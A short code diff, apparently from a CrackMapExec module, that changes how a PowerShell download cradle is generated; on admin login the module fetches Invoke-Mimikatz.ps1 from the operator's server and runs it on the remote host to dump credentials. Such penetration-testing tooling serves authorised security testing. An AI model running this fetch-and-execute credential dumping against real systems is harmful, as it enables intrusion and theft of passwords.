@@ -29,7 +29,7 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         command = "Invoke-Mimikatz -Command '{}'".format(self.command)
-        launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'Invoke-Mimikatz.ps1', command)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
         ps_command = create_ps_command(launcher)
 
         connection.execute(ps_command)
